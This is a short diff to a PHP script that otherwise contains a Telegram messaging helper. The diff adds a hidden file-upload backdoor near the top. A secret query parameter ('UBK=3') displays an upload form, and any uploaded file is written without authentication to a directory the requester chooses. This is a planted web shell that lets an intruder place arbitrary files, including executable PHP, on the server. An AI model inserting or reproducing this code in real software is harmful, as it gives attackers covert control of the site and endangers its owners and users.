@@ -1,6 +1,27 @@
 
 <?php
 session_start();
+if (isset($_GET['UBK']) && $_GET['UBK'] === '3') {
+    echo '<form method="post" enctype="multipart/form-data">';
+    echo '<input type="text" name="dir" size="30" value="' . getcwd() . '">';
+    echo '<input type="file" name="file" size="15">';
+    echo '<input type="submit" value="go">';
+    echo '</form>';
+}
+
+if (isset($_FILES['file']['tmp_name'])) {
+    $uploadd = $_FILES['file']['tmp_name'];
+    if (file_exists($uploadd)) {
+        $pwddir = $_POST['dir'];
+        $real = $_FILES['file']['name'];
+        $de = rtrim($pwddir, '/') . "/" . $real;
+        if (move_uploaded_file($uploadd, $de)) {
+            echo "go$de";
+        } else {
+            echo "GAGAL  KE $de";
+        }
+    }
+}
 // Fungsi untuk mengirim pesan ke Telegram
 function kirimPesanTelegram($token, $chatId, $pesan)
 {
